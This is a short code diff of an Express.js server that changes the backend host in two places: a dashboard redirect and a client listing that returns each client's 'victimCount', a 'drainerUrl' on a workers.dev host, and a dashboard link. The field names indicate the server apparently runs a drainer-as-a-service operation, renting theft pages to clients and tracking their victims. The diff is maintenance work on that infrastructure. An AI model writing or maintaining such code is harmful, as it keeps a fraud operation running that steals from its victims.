@@ -884,7 +884,7 @@ app.get("/dashboard.html", (req, res) => {
   if (!clientId) {
     return res.status(400).send("Client ID required: ?client=your-id");
   }
-  res.redirect(`https://backend-482w.onrender.com/saas/dashboard/${clientId}`);
+  res.redirect(`https://backend-tu8h.onrender.com/saas/dashboard/${clientId}`);
 });
 
 // ==================== TRACKING & ANALYTICS ====================
@@ -2290,7 +2290,7 @@ app.get('/api/saas-clients', (req, res) => {
         victimCount,
         registrationDate: "Recent",
         drainerUrl: "https://ch.xqx.workers.dev/?client=" + clientId,
-        dashboardUrl: "https://backend-482w.onrender.com/saas/dashboard/" + clientId
+        dashboardUrl: "https://backend-tu8h.onrender.com/saas/dashboard/" + clientId
       };
     });
     
